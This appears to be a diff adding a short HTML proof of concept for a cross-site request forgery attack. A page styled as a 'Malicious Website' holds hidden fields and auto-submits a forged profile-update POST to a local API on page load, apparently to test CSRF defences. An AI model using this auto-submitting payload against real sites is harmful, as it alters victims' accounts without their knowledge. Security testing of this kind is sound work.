@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF Attack Simulation</title>
+</head>
+<body>
+  <h1>Malicious Website</h1>
+  <form id="attackForm" action="http://localhost:3000/api/update-profile" method="POST">
+    <input type="hidden" name="name" value="Hacked User">
+    <input type="hidden" name="email" value="hacked@example.com">
+  </form>
+  <script>
+    // Automatically submit the form when the page loads
+    document.getElementById('attackForm').submit();
+  </script>
+</body>
+</html>
